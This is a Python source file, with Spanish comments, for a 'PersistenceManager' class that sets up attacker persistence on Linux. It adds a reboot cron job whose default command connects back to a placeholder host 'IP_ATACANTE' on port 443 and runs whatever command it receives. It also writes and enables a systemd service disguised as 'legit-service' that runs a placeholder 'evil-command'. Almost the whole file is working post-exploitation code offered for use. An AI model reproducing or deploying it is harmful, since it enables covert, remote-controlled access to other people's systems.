import os
import crontab

class PersistenceManager:
    def __init__(self, method='cron'):
        self.method = method

    def install_cron(self, command="python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"IP_ATACANTE\",443));subprocess.call([s.recv(1024).decode(),\"-i\"])'"):
        """Crea una tarea cron para persistencia."""
        cron = crontab.CronTab(user=True)
        job = cron.new(command=command)
        job.every_reboot()
        cron.write()

    def systemd_service(self, name="legit-service"):
        """Crea un servicio systemd malicioso."""
        service_content = f"""
        [Unit]
        Description={name}

        [Service]
        ExecStart=/bin/bash -c "evil-command"
        Restart=always

        [Install]
        WantedBy=multi-user.target
        """
        with open(f"/etc/systemd/system/{name}.service", "w") as f:
            f.write(service_content)
        os.system("systemctl enable " + name)
